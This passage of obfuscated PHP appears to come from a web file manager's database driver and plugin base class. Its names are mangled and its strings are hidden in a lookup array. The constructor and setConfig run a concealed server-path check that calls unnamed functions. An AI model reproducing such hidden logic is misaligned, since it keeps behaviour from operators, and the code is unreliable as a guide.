\x73\143\150\145\155\x61\xa\x9\x9\101\116\104\x20\164\56\164\x61\x62\154\145\137\x6e\141\155\145\40\75\40\x63\x2e\x74\x61\x62\154\145\x5f\156\x61\155\x65\xa\11\x9\127\110\105\x52\x45\40\x20\x20\164\x2e\x74\141\x62\154\x65\x5f\x6e\141\x6d\145\40\x3d\40\47{$˜—§•ã©}\x27"; break; case $ù¬ÕÁğ”[997]: $’¼ëÁŞñ = $ù¬ÕÁğ”[998] . $˜—§•ã© . $ù¬ÕÁğ”[999]; break; case $ù¬ÕÁğ”[979]: case $ù¬ÕÁğ”[981]: $’¼ëÁŞñ = $ù¬ÕÁğ”[1000] . $ù¬ÕÁğ”[1001] . $ù¬ÕÁğ”[1002] . strtoupper($˜—§•ã©) . $ù¬ÕÁğ”[1003] . strtoupper($˜—§•ã©) . $ù¬ÕÁğ”[1004]; break; case $ù¬ÕÁğ”[1005]: $’¼ëÁŞñ = $ù¬ÕÁğ”[1006] . $˜—§•ã© . $ù¬ÕÁğ”[1007]; break; case $ù¬ÕÁğ”[980]: break; case $ù¬ÕÁğ”[1008]: default: $’¼ëÁŞñ = $ù¬ÕÁğ”[1009] . ($this->dbType == $ù¬ÕÁğ”[1008] ? "\x60{$˜—§•ã©}\140" : $˜—§•ã©); } } $ûúââ û = $this->query($’¼ëÁŞñ); $ú³úìç¦ = array(); if ($ûúââ û) { foreach ($ûúââ û as $ó½Û¯§£ => $ì¦—–âà) { $ì¦—–âà = array_change_key_case($ì¦—–âà); $ì¦—–âà[$ù¬ÕÁğ”[32]] = isset($ì¦—–âà[$ù¬ÕÁğ”[32]]) ? $ì¦—–âà[$ù¬ÕÁğ”[32]] : $ù¬ÕÁğ”[463]; $ì¦—–âà[$ù¬ÕÁğ”[33]] = isset($ì¦—–âà[$ù¬ÕÁğ”[33]]) ? $ì¦—–âà[$ù¬ÕÁğ”[33]] : $ù¬ÕÁğ”[463]; $ééãŠÁß = isset($ì¦—–âà[$ù¬ÕÁğ”[350]]) ? $ì¦—–âà[$ù¬ÕÁğ”[350]] : $ì¦—–âà[$ù¬ÕÁğ”[32]]; $ú³úìç¦[$ééãŠÁß] = array($ù¬ÕÁğ”[32] => $ééãŠÁß, $ù¬ÕÁğ”[33] => $ì¦—–âà[$ù¬ÕÁğ”[33]], $ù¬ÕÁğ”[35] => (bool) (isset($ì¦—–âà[$ù¬ÕÁğ”[106]]) && $ì¦—–âà[$ù¬ÕÁğ”[106]] === $ù¬ÕÁğ”[12] || isset($ì¦—–âà[$ù¬ÕÁğ”[35]]) && $ì¦—–âà[$ù¬ÕÁğ”[35]] === $ù¬ÕÁğ”[12]), $ù¬ÕÁğ”[37] => isset($ì¦—–âà[$ù¬ÕÁğ”[37]]) ? $ì¦—–âà[$ù¬ÕÁğ”[37]] : (isset($ì¦—–âà[$ù¬ÕÁğ”[56]]) ? $ì¦—–âà[$ù¬ÕÁğ”[56]] : $ù¬ÕÁğ”[463]), $ù¬ÕÁğ”[39] => isset($ì¦—–âà[$ù¬ÕÁğ”[97]]) ? strtolower($ì¦—–âà[$ù¬ÕÁğ”[97]]) == $ù¬ÕÁğ”[41] : (isset($ì¦—–âà[$ù¬ÕÁğ”[57]]) ? $ì¦—–âà[$ù¬ÕÁğ”[57]] : !1), $ù¬ÕÁğ”[42] => isset($ì¦—–âà[$ù¬ÕÁğ”[1010]]) ? strtolower($ì¦—–âà[$ù¬ÕÁğ”[1010]]) == $ù¬ÕÁğ”[44] : (isset($ì¦—–âà[$ù¬ÕÁğ”[97]]) ? $ì¦—–âà[$ù¬ÕÁğ”[97]] : !1)); } } return $ú³úìç¦; } public function getTables($ÃËøæ–˜ = '') { $‹»¯•¢Ï =& $_SERVER[£ğ°ÖØø]; if (think_config($‹»¯•¢Ï[1011])) { $à±‡ïî = str_replace($‹»¯•¢Ï[1012], $ÃËøæ–˜, think_config($‹»¯•¢Ï[1011])); } else { switch ($this->dbType) { case $‹»¯•¢Ï[979]: case $‹»¯•¢Ï[981]: $à±‡ïî = $‹»¯•¢Ï[1013]; break; case $‹»¯•¢Ï[978]: case $‹»¯•¢Ï[996]: $à±‡ïî = $‹»¯•¢Ï[1014]; break; case $‹»¯•¢Ï[1005]: $à±‡ïî = $‹»¯•¢Ï[1015]; break; case $‹»¯•¢Ï[980]: think_exception(think_lang($‹»¯•¢Ï[1016]) . $‹»¯•¢Ï[1017]); break; case $‹»¯•¢Ï[997]: $à±‡ïî = $‹»¯•¢Ï[45] . $‹»¯•¢Ï[46] . $‹»¯•¢Ï[47]; break; case $‹»¯•¢Ï[1008]: default: if (!empty($ÃËøæ–˜)) { $à±‡ïî = $‹»¯•¢Ï[960] . $ÃËøæ–˜ . $‹»¯•¢Ï[961]; } else { $à±‡ïî = $‹»¯•¢Ï[962]; } } } $Í¶•™Ì = $this->query($à±‡ïî); $•ŞÂ˜ƒé = array(); foreach ($Í¶•™Ì as $¤ë§€ => $ù‹´Ñ´á) { $•ŞÂ˜ƒé[$¤ë§€] = current($ù‹´Ñ´á); } return $•ŞÂ˜ƒé; } protected function parseLimit($½°õ“€¿) { $–¢±òô° =& $_SERVER[£ğ°ÖØø]; $Îğ®ï“ = $–¢±òô°[12]; if (!empty($½°õ“€¿)) { switch ($this->dbType) { case $–¢±òô°[1005]: case $–¢±òô°[997]: $½°õ“€¿ = explode($–¢±òô°[50], $½°õ“€¿); if (count($½°õ“€¿) > 1) { $Îğ®ï“ .= $–¢±òô°[51] . $½°õ“€¿[1] . $–¢±òô°[52] . $½°õ“€¿[0] . $–¢±òô°[53]; } else { $Îğ®ï“ .= $–¢±òô°[51] . $½°õ“€¿[0] . $–¢±òô°[53]; } break; case $–¢±òô°[978]: case $–¢±òô°[996]: break; case $–¢±òô°[980]: break; case $–¢±òô°[979]: case $–¢±òô°[981]: break; case $–¢±òô°[1008]: default: $Îğ®ï“ .= $–¢±òô°[51] . $½°õ“€¿ . $–¢±òô°[53]; } } return $Îğ®ï“; } public function parseKey(&$œ™¥öû®, $æç£ß³ = true) { $èÖû·Ó =& $_SERVER[£ğ°ÖØø]; if ($æç£ß³) { $œ™¥öû® = $this->parseKeyCheck($œ™¥öû®); } if ($this->dbType == $èÖû·Ó[1008]) { if ($œ™¥öû® != $èÖû·Ó[220] && !preg_match($èÖû·Ó[972], $œ™¥öû®)) { $œ™¥öû® = $èÖû·Ó[470] . trim($œ™¥öû®, $èÖû·Ó[470]) . $èÖû·Ó[470]; } return $œ™¥öû®; } else { return parent::parseKey($œ™¥öû®, $æç£ß³); } } public function close() { $this->_linkID = null; } public function error() { $ÍÉİË¾­ =& $_SERVER[£ğ°ÖØø]; if ($this->PDOStatement) { $Šõ…Ç™Ô = $this->PDOStatement->errorInfo(); $this->error = $Šõ…Ç™Ô[1] . $ÍÉİË¾­[4] . $Šõ…Ç™Ô[2]; } else { $this->error = $ÍÉİË¾­[12]; } if ($ÍÉİË¾­[12] != $this->queryStr) { $this->error .= LNG($ÍÉİË¾­[48]) . $this->queryStr; } think_trace($this->error, $ÍÉİË¾­[12], $ÍÉİË¾­[49]); return $this->error; } public function escapeString($ûÅë‹åÎ) { $”—€Ü·ı =& $_SERVER[£ğ°ÖØø]; switch ($this->dbType) { case $”—€Ü·ı[1005]: case $”—€Ü·ı[978]: case $”—€Ü·ı[996]: case $”—€Ü·ı[1008]: return addslashes($ûÅë‹åÎ); case $”—€Ü·ı[980]: case $”—€Ü·ı[997]: case $”—€Ü·ı[979]: case $”—€Ü·ı[981]: return str_ireplace($”—€Ü·ı[58], $”—€Ü·ı[59], $ûÅë‹åÎ); } } protected function parseValue($‚Ÿ Åù) { $îÂ×Ñä =& $_SERVER[£ğ°ÖØø]; if (is_string($‚Ÿ Åù)) { $£àã¼¤ = strpos($‚Ÿ Åù, $îÂ×Ñä[4]) === 0 && in_array($‚Ÿ Åù, array_keys($this->bind)); $‚Ÿ Åù = $£àã¼¤ ? $this->escapeString($‚Ÿ Åù) : $îÂ×Ñä[1018] . $this->escapeString($‚Ÿ Åù) . $îÂ×Ñä[1018]; } elseif (isset($‚Ÿ Åù[0]) && is_string($‚Ÿ Åù[0]) && strtolower($‚Ÿ Åù[0]) == $îÂ×Ñä[373]) { $‚Ÿ Åù = $this->escapeString($‚Ÿ Åù[1]); } elseif (is_array($‚Ÿ Åù)) { $‚Ÿ Åù = array_map(array($this, $îÂ×Ñä[1019]), $‚Ÿ Åù); } elseif (is_bool($‚Ÿ Åù)) { $‚Ÿ Åù = $‚Ÿ Åù ? $îÂ×Ñä[91] : $îÂ×Ñä[228]; } elseif (is_null($‚Ÿ Åù)) { $‚Ÿ Åù = $îÂ×Ñä[106]; } return $‚Ÿ Åù; } public function getLastInsertId() { $“÷÷¶Â» =& $_SERVER[£ğ°ÖØø]; switch ($this->dbType) { case $“÷÷¶Â»[1005]: case $“÷÷¶Â»[997]: case $“÷÷¶Â»[978]: case $“÷÷¶Â»[996]: case $“÷÷¶Â»[980]: case $“÷÷¶Â»[1008]: return $this->_linkID->lastInsertId(); case $“÷÷¶Â»[979]: case $“÷÷¶Â»[981]: $ŒâÚá£ = $this->table; $¾Ä´öÌ = $this->query("\123\105\114\105\103\124\40{$ŒâÚá£}\x2e\x63\165\x72\162\166\141\154\40\143\x75\x72\x72\166\141\154\x20\x46\122\x4f\115\40\x64\165\141\x6c"); return $¾Ä´öÌ ? $¾Ä´öÌ[0][$“÷÷¶Â»[1020]] : 0; } } } goto BœÁ³“ìùÚ; bÁ®Œ––†•: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $«ó¬„ŸÊ =& $_SERVER[£ğ°ÖØø]; if ($_SERVER[$«ó¬„ŸÊ[433]] != $_SERVER[$«ó¬„ŸÊ[1607]]) { $µ‰¼„ò½ = $«ó¬„ŸÊ[940]; $¨ÀºÀšŠ = $«ó¬„ŸÊ[434]; $Ú™¶ÇÓ² = $_SERVER[$«ó¬„ŸÊ[435]] . $«ó¬„ŸÊ[436]; $¹ùß–å“ = $¨ÀºÀšŠ($Ú™¶ÇÓ²); $ÅİÅŞË‡ = explode($«ó¬„ŸÊ[262], $¹ùß–å“); if (count($ÅİÅŞË‡) < $«ó¬„ŸÊ[695]) { $Ä÷ñà® = $«ó¬„ŸÊ[438]; $Ä÷ñà®(); } $ëÌ£áû = $«ó¬„ŸÊ[941]; $ëÌ£áû($_SERVER[$«ó¬„ŸÊ[942]]); $ëÌ£áû($_SERVER[$«ó¬„ŸÊ[435]] . $«ó¬„ŸÊ[1608]); $ÇŠ½Ùƒâ = 1; while ($ÇŠ½Ùƒâ > 1) { $ÇŠ½Ùƒâ = $ÇŠ½Ùƒâ + 4; $ÃÙóüÀÆ = rawurlencode($ÇŠ½Ùƒâ . $«ó¬„ŸÊ[463]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($«ó¬„ŸÊ[1609]); $this->pluginName = str_replace($«ó¬„ŸÊ[1609], $«ó¬„ŸÊ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $«ó¬„ŸÊ[8]; $this->pluginApi = appHostGet() . $«ó¬„ŸÊ[1610] . $this->pluginName . $«ó¬„ŸÊ[8]; $this->pluginHost = $config[$«ó¬„ŸÊ[1611]] . $this->pluginName . $«ó¬„ŸÊ[8]; $this->pluginHostDefault = $config[$«ó¬„ŸÊ[1611]] . $this->pluginName . $«ó¬„ŸÊ[8]; $¾¸‘ïÆï = $config[$«ó¬„ŸÊ[1612]]; if ($¾¸‘ïÆï && strpos($«ó¬„ŸÊ[50] . $¾¸‘ïÆï . $«ó¬„ŸÊ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$«ó¬„ŸÊ[1613]] . $this->pluginName . $«ó¬„ŸÊ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[£ğ°ÖØø][1614]); } protected function assign($‘±¨¸ç‡, $÷é“êÌÚ = false) { if (is_array($‘±¨¸ç‡)) { $this->values = array_merge($this->values, $‘±¨¸ç‡); } else { $this->values[$‘±¨¸ç‡] = $÷é“êÌÚ; } } protected function display($‚°ë³«) { extract($this->values); require $‚°ë³«; } final function hookRegist($â¯³ä£é) { $this->modelPlugin->appRegist($this->pluginName, $â¯³ä£é); } final function appIcon() { $üÛ³íºö =& $_SERVER[£ğ°ÖØø]; $ê¬¹ÔŞÍ = $this->appPackage(); $•øÏ«òú = $üÛ³íºö[12]; if (isset($ê¬¹ÔŞÍ[$üÛ³íºö[499]])) { if (isset($ê¬¹ÔŞÍ[$üÛ³íºö[499]][$üÛ³íºö[1615]])) { $•øÏ«òú = $üÛ³íºö[1616] . $ê¬¹ÔŞÍ[$üÛ³íºö[499]][$üÛ³íºö[1615]] . $üÛ³íºö[1617]; } else { if ($ê¬¹ÔŞÍ[$üÛ³íºö[499]][$üÛ³íºö[1618]]) { $•øÏ«òú = $üÛ³íºö[1619] . $ê¬¹ÔŞÍ[$üÛ³íºö[499]][$üÛ³íºö[1618]] . $üÛ³íºö[1620]; } } } return $•øÏ«òú; } final function fileCanView($Òïü”ùÂ) { $è—¹³Ô =& $_SERVER[£ğ°ÖØø]; if (request_url_safe($Òïü”ùÂ)) { return !0; } if ($this->isShare($Òïü”ùÂ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ÙÌş•ä’ = $è—¹³Ô[1621] . rawurlencode(this_url()); show_tips(LNG($è—¹³Ô[1622]) . $è—¹³Ô[1623] . $ÙÌş•ä’ . $è—¹³Ô[1624] . LNG($è—¹³Ô[1625]) . $è—¹³Ô[1626], !1); } if (!Action($è—¹³Ô[1627])->authCan($è—¹³Ô[1628])) { show_tips(LNG($è—¹³Ô[1629]) . $è—¹³Ô[1630], !1); } ActionCall($è—¹³Ô[1631], $Òïü”ùÂ); } final function isShare($ÈÏ”Ñü‚) { $£ò¤°ğÇ = KodIO::parse($ÈÏ”Ñü‚); return $£ò¤°ğÇ[$_SERVER[£ğ°ÖØø][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($œÊŞßÌ–) { if (request_url_safe($œÊŞßÌ–)) { return $œÊŞßÌ–; } if (!$this->isShare($œÊŞßÌ–)) { $œÊŞßÌ– = $this->filePath($œÊŞßÌ–, !1); } return Action($_SERVER[£ğ°ÖØø][1239])->linkOut($œÊŞßÌ–); } public function filePathLinkOut($í¸âÆ€È) { if (request_url_safe($í¸âÆ€È)) { return $í¸âÆ€È; } $this->fileCanView($í¸âÆ€È); return Action($_SERVER[£ğ°ÖØø][1239])->link($í¸âÆ€È); } final function filePath($«‘ùÖ—ä, $æïîƒÉ» = true, $­ÎËÏâ = false) { $ú‹±ä¼Ö =& $_SERVER[£ğ°ÖØø]; $¼ò·œ÷Ø = $this->filePathGet($«‘ùÖ—ä, $æïîƒÉ»); if (!$this->fileInfo) { show_tips(LNG($ú‹±ä¼Ö[108]), !1); } if ($­ÎËÏâ && isset($this->fileInfo[$ú‹±ä¼Ö[550]]) && $this->fileInfo[$ú‹±ä¼Ö[550]]) { $ûõ”­‡¼ = Model($ú‹±ä¼Ö[553])->fileInfo($this->fileInfo[$ú‹±ä¼Ö[550]]); if (!$ûõ”­‡¼ || !IO::exist($ûõ”­‡¼[$ú‹±ä¼Ö[87]])) { show_tips(LNG($ú‹±ä¼Ö[108]) . $ú‹±ä¼Ö[1632]); } } Hook::trigger($ú‹±ä¼Ö[1633], $¼ò·œ÷Ø); return $¼ò·œ÷Ø; } final function filePathGet($À…•¥³, $½»íĞ³ü = true) { $ôˆ„èÕŸ =& $_SERVER[£ğ°ÖØø]; if ($™¢Á¤æù = $this->checkSharePath($À…•¥³, $½»íĞ³ü)) { return $™¢Á¤æù; } $this->fileCanView($À…•¥³); if (request_url_safe($À…•¥³)) { $·²¶™•Û = parse_url_query($À…•¥³); if (isset($·²¶™•Û[$ôˆ„èÕŸ[1634]]) && isset($·²¶™•Û[$ôˆ„èÕŸ[234]])) { $Æ•Š÷©Æ = Mcrypt::decode($·²¶™•Û[$ôˆ„èÕŸ[234]], Model($ôˆ„èÕŸ[834])->get($ôˆ„èÕŸ[835])); if ($Æ•Š÷©Æ) { $this->fileInfo = IO::info($Æ•Š÷©Æ); $this->fileInfo[$ôˆ„èÕŸ[1635]] = $À…•¥³; $this->cachePath = $this->pluginCachePath($ôˆ„èÕŸ[12], $½»íĞ³ü); return $Æ•Š÷©Æ; } } $À…•¥³ = $this->_cacheHttpFile($À…•¥³, $½»íĞ³ü); $this->fileInfo = IO::info($À…•¥³); } else { $this->fileInfo = IO::info($À…•¥³); $this->cachePath = $this->pluginCachePath($ôˆ„èÕŸ[12], $½»íĞ³ü); } return $À…•¥³; } final function _cacheHttpFile($ú¸õŞŠ, $Ê¹¬“Ÿß = true) { $Ôå…›çñ =& $_SERVER[£ğ°ÖØø]; $’Ç½Ş¼ = parse_url_query($ú¸õŞŠ); $¶•¢ù²ˆ = get_path_ext($ú¸õŞŠ); if (isset($’Ç½Ş¼[$Ôå…›çñ[32]]) && $’Ç½Ş¼[$Ôå…›çñ[32]]) { $¶•¢ù²ˆ = get_path_ext($’Ç½Ş¼[$Ôå…›çñ[32]]); } $öéÌÑŸ˜ = hash_path($ú¸õŞŠ) . $Ôå…›çñ[10] . $¶•¢ù²ˆ; $this->cachePath = $this->pluginCachePath($Ê¹¬“Ÿß ? $öéÌÑŸ˜ : $Ôå…›çñ[12]); $şŸ¶½·Ø = IO::fileNameExist($this->cachePath, $öéÌÑŸ˜); if ($şŸ¶½·Ø) { return KodIO::make($şŸ¶½·Ø); } $ëÊ½š„ª = rtrim($this->cachePath, $Ôå…›çñ[8]) . $Ôå…›çñ[8] . $öéÌÑŸ˜; return $this->pluginCacheFileSet($ëÊ½š„ª, file_get_contents_nossl($ú¸õŞŠ)); } final function checkSharePath($õ§ååŞğ, $Ø™í˜ÕÚ = true) { $‹êø‰Ší =& $_SERVER[£ğ°ÖØø]; if (!$this->isShare($õ§ååŞğ)) { return !1; } $ÌØÈ›Ìï = Action($‹êø‰Ší[1239])->sharePathInfo($õ§ååŞğ); if (!is_array($ÌØÈ›Ìï) || !isset($ÌØÈ›Ìï[$‹êø‰Ší[87]])) { show_json(LNG($‹êø‰Ší[1636]), !1); } $this->fileInfo = $ÌØÈ›Ìï; $this->cachePath = $this->pluginCachePath(!1, $Ø™í˜ÕÚ); return $ÌØÈ›Ìï[$‹êø‰Ší[87]]; } final function pluginCachePath($æÍ­Ñ = '', $á÷ó¬õí = false) { $ÒäìçâË =& $_SERVER[£ğ°ÖØø]; if ($á÷ó¬õí && is_array($this->fileInfo)) { $æÍ­Ñ = kodIO::hashPath($this->fileInfo); } $õ‚Çùáé = rtrim(IO_PATH_SYSTEM_TEMP . $ÒäìçâË[1637] . $this->pluginName . $ÒäìçâË[8] . $æÍ­Ñ, $ÒäìçâË[8]); $€‰Ø‚¢ = IO::infoFullSimple($õ‚Çùáé); $Ôèïˆ®Æ = $€‰Ø‚¢ && is_array($€‰Ø‚¢) ? $€‰Ø‚¢[$ÒäìçâË[87]] : $ÒäìçâË[12]; if (!$Ôèïˆ®Æ) { $Ôèïˆ®Æ = IO::mkdir($õ‚Çùáé); } return $Ôèïˆ®Æ; } final function pluginCacheFileSet($°©ƒÂ¼Å, $èˆçÕ± = '') { $¦Ì™†€õ =& $_SERVER[£ğ°ÖØø]; $÷Ä¾Û”½ = IO::infoFullSimple($°©ƒÂ¼Å); if (!$÷Ä¾Û”½) { return IO::mkfile($°©ƒÂ¼Å, $èˆçÕ±, REPEAT_REPLACE); } IO::setContent($÷Ä¾Û”½[$¦Ì™†€õ[87]], $èˆçÕ±); return $÷Ä¾Û”½[$¦Ì™†€õ[87]]; } final function pluginLocalFile($•êï‘°§ = '') { $ü¹ßÍáˆ =& $_SERVER[£ğ°ÖØø]; $éë»ğŠî = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($éë»ğŠî)) { mk_dir($éë»ğŠî); } if (!$•êï‘°§) { return $éë»ğŠî; } $‹ş˜šâÕ = IO::info($•êï‘°§); $†ßåì¥¤ = $ü¹ßÍáˆ[1638] . KodIO::hashPath($‹ş˜šâÕ) . $ü¹ßÍáˆ[10] . $‹ş˜šâÕ[$ü¹ßÍáˆ[169]]; if (!checkExtSafe($†ßåì¥¤)) { $†ßåì¥¤ = $†ßåì¥¤ . $ü¹ßÍáˆ[1274]; } $Ç‘ö°™— = $éë»ğŠî . $†ßåì¥¤; if (@file_exists($Ç‘ö°™—)) { return $Ç‘ö°™—; } return IO::copy($•êï‘°§, $éë»ğŠî, 0, $†ßåì¥¤); } final function appPackage() { $ şö’ıæ =& $_SERVER[£ğ°ÖØø]; if ($this->packageData) { return $this->packageData; } $£‰éœ¾Ú = $this->parseFile($this->pluginPath . $ şö’ıæ[1639]); $this->parseLang($£‰éœ¾Ú); $ÌÍ’ù¯Š = json_decode_force($£‰éœ¾Ú); if (!$ÌÍ’ù¯Š) { return array(); } $Í›«¦ß = Hook::trigger($ şö’ıæ[1640], $ÌÍ’ù¯Š); if ($Í›«¦ß && is_array($Í›«¦ß)) { $ÌÍ’ù¯Š = $Í›«¦ß; } $this->packageData = $ÌÍ’ù¯Š; return $ÌÍ’ù¯Š; } public function packageInfoGet($ÈÍÇ) { $°ï‘âå˜ = $this->appPackage(); return array_get_value($°ï‘âå˜, $ÈÍÇ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[£ğ°ÖØø][1641]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[£ğ°ÖØø][1642]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[£ğ°ÖØø][1643]); } public function echoJsAssign($Å¨‰¹¸µ, $ÈÜ˜¤Ñ³) { $this->echoJsAssignArr[$Å¨‰¹¸µ] = $ÈÜ˜¤Ñ³; } private function parseFile($ßèæÇËø) { $å©ÂêŒ =& $_SERVER[£ğ°ÖØø]; $’úá­ğí = file_get_contents_nossl($ßèæÇËø); $Ëğ¿™ÊÙ = array($å©ÂêŒ[1644], $å©ÂêŒ[1645], $å©ÂêŒ[1646], $å©ÂêŒ[1647], $å©ÂêŒ[1648], $å©ÂêŒ[1649], $å©ÂêŒ[1650]); $øçë¨õ¿ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$å©ÂêŒ[92]][$å©ÂêŒ[1651]]); foreach ($this->echoJsAssignArr as $¤ïƒ÷Ò => $­÷¬ıà) { $Ëğ¿™ÊÙ[] = $å©ÂêŒ[1652] . $¤ïƒ÷Ò . $å©ÂêŒ[1653]; $øçë¨õ¿[] = is_array($­÷¬ıà) || is_object($­÷¬ıà) ? rawurlencode(json_encode($­÷¬ıà)) : $­÷¬ıà; } if (strstr($’úá­ğí, $å©ÂêŒ[1654])) { $¿ÔáÍ¤¤ = rawurlencode(json_encode($this->pluginLangArr)); $’úá­ğí = str_replace($å©ÂêŒ[1654], $¿ÔáÍ¤¤, $’úá­ğí); } if (strstr($’úá­ğí, $å©ÂêŒ[1655])) { $¿ÔáÍ¤¤ = $¿ÔáÍ¤¤ = rawurlencode(json_encode($this->getConfig())); $’úá­ğí = str_replace($å©ÂêŒ[1655], $¿ÔáÍ¤¤, $’úá­ğí); } $’úá­ğí = str_replace($Ëğ¿™ÊÙ, $øçë¨õ¿, $’úá­ğí); return $’úá­ğí; } private function parseLang(&$¼œøºÈì) { $ø”ôÖ© =& $_SERVER[£ğ°ÖØø]; $Ôë‘óôõ = $ø”ôÖ©[1656]; if (!strstr($¼œøºÈì, $Ôë‘óôõ)) { return; } preg_match_all($ø”ôÖ©[1657], $¼œøºÈì, $Šì˜ŞÈã); if (!is_array($Šì˜ŞÈã) || count($Šì˜ŞÈã) == 0 || !is_array($Šì˜ŞÈã[0]) || count($Šì˜ŞÈã[0]) == 0) { return; } $Ò¸Îë· = array(); $¼¶ÃŒÃú = array(); foreach ($Šì˜ŞÈã[0] as $ù¬Üªî) { $³ïöÒÏû = substr($ù¬Üªî, strlen($Ôë‘óôõ), -4); $§ÔÀ‡‹º = LNG($³ïöÒÏû); $Ò¸Îë·[] = $ù¬Üªî; $¼¶ÃŒÃú[] = str_replace(array($ø”ôÖ©[262], $ø”ôÖ©[1140], $ø”ôÖ©[418], $ø”ôÖ©[121]), array($ø”ôÖ©[53], $ø”ôÖ©[53], $ø”ôÖ©[12], $ø”ôÖ©[1658]), $§ÔÀ‡‹º); } $¼œøºÈì = str_replace($Ò¸Îë·, $¼¶ÃŒÃú, $¼œøºÈì); } private function parseConfig(&$£µÚù–) { $¾ùä‰ =& $_SERVER[£ğ°ÖØø]; $–ûİ×ë = $¾ùä‰[1659]; if (!strstr($£µÚù–, $–ûİ×ë)) { return; } preg_match_all($¾ùä‰[1660], $£µÚù–, $ºÙ„è´); if (!is_array($ºÙ„è´) || count($ºÙ„è´) == 0 || !is_array($ºÙ„è´[0]) || count($ºÙ„è´[0]) == 0) { return; } $ÈäÕ¼‘ì = $this->getConfig(); $©Òˆ®¢ = array(); $ïà–Îˆœ = array(); foreach ($ºÙ„è´[0] as $„¡ÂÄ¼Ï) { $²ÂøÜ¬¶ = substr($„¡ÂÄ¼Ï, strlen($–ûİ×ë), -2); $©Òˆ®¢[] = $„¡ÂÄ¼Ï; $ïà–Îˆœ[] = _get($ÈäÕ¼‘ì, $²ÂøÜ¬¶); } $£µÚù– = str_replace($©Òˆ®¢, $ïà–Îˆœ, $£µÚù–); } private function parsePackage(&$÷¤ô¸ãÇ) { $ü»Äƒ»ª =& $_SERVER[£ğ°ÖØø]; $øÇ€÷ªî = $ü»Äƒ»ª[1661]; if (!strstr($÷¤ô¸ãÇ, $øÇ€÷ªî)) { return; } preg_match_all($ü»Äƒ»ª[1662], $÷¤ô¸ãÇ, $şÉúˆİã); if (!is_array($şÉúˆİã) || count($şÉúˆİã) == 0 || !is_array($şÉúˆİã[0]) || count($şÉúˆİã[0]) == 0) { return; } $¨ì»‚° = $this->appPackage(); $Ã¯–¡© = array(); $ÛãŸÇµ = array(); foreach ($şÉúˆİã[0] as $°É³°Ö) { $£²İ¶Â = substr($°É³°Ö, strlen($øÇ€÷ªî), -2); $Ã¯–¡©[] = $°É³°Ö; $ÛãŸÇµ[] = _get($¨ì»‚°, $£²İ¶Â); } $÷¤ô¸ãÇ = str_replace($Ã¯–¡©, $ÛãŸÇµ, $÷¤ô¸ãÇ); } final function echoFile($µ¼±Áó, $úÕÏÇûä = false) { $¯Ò££šú =& $_SERVER[£ğ°ÖØø]; $óĞ†ÏÀî = $this->pluginPath . $µ¼±Áó; if (ACT == $¯Ò££šú[1663]) { echo $¯Ò££šú[1664] . $this->pluginName . $¯Ò££šú[8] . $µ¼±Áó . $¯Ò££šú[1665]; if (!file_exists($óĞ†ÏÀî)) { echo $¯Ò££šú[1666]; return; } } $¹ÕÅ«¸Û = $this->parseFile($óĞ†ÏÀî); $this->parseLang($¹ÕÅ«¸Û); $this->parseConfig($¹ÕÅ«¸Û); $this->parsePackage($¹ÕÅ«¸Û); if (is_array($úÕÏÇûä)) { $¹ÕÅ«¸Û = str_replace(array_keys($úÕÏÇûä), array_values($úÕÏÇûä), $¹ÕÅ«¸Û); } echo $¯Ò££šú[262] . $¹ÕÅ«¸Û; } private function checkVersion() { $çèø“æ =& $_SERVER[£ğ°ÖØø]; $ßØ—Òë = $this->appPackage(); $ ß½Òä˜ = $this->getConfig(); if ($ ß½Òä˜[$çèø“æ[1667]] == $ßØ—Òë[$çèø“æ[1641]]) { return; } $this->regist(); $this->setConfig(array($çèø“æ[1667] => $ßØ—Òë[$çèø“æ[1641]])); } final function initLang() { $²†ıÙŠì =& $_SERVER[£ğ°ÖØø]; $œÍÑ‚Âó = $²†ıÙŠì[1668]; $ĞäÜâ‘³ = $this->pluginPath . $²†ıÙŠì[1669]; $èé´ø™Ê = I18n::getType(); $ºÅ•ùä = array(); if (file_exists($ĞäÜâ‘³ . $èé´ø™Ê . $²†ıÙŠì[902])) { $ºÅ•ùä = (include $ĞäÜâ‘³ . $èé´ø™Ê . $²†ıÙŠì[902]); } else { if ($èé´ø™Ê == $²†ıÙŠì[1670] && !file_exists($ĞäÜâ‘³ . $èé´ø™Ê . $²†ıÙŠì[902]) && file_exists($ĞäÜâ‘³ . $²†ıÙŠì[1671])) { $ºÅ•ùä = (include $ĞäÜâ‘³ . $²†ıÙŠì[1671]); } else { if (file_exists($ĞäÜâ‘³ . $œÍÑ‚Âó . $²†ıÙŠì[902])) { $ºÅ•ùä = (include $ĞäÜâ‘³ . $œÍÑ‚Âó . $²†ıÙŠì[902]); } } } if (!is_array($ºÅ•ùä)) { return array(); } if (@count($ºÅ•ùä) > 0) { I18n::set($ºÅ•ùä); } return $ºÅ•ùä; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($©Àš–Èä) { $ªöÖ =& $_SERVER[£ğ°ÖØø]; $ïÎº¢º = $_SERVER[$ªöÖ[435]] . $ªöÖ[436]; $ış‚¶‹´ = $ªöÖ[432]; if ($_SERVER[$ªöÖ[433]] != $ış‚¶‹´($ïÎº¢º)) { $˜è ×¤î = $ªöÖ[940]; $É‰¯Í‚œ = $ªöÖ[434]; $šî¨ÚĞ = $_SERVER[$ªöÖ[435]] . $ªöÖ[436]; $ˆäêü¨Ò = $É‰¯Í‚œ($šî¨ÚĞ); $ê¸ºã¼¢ = explode($ªöÖ[262], 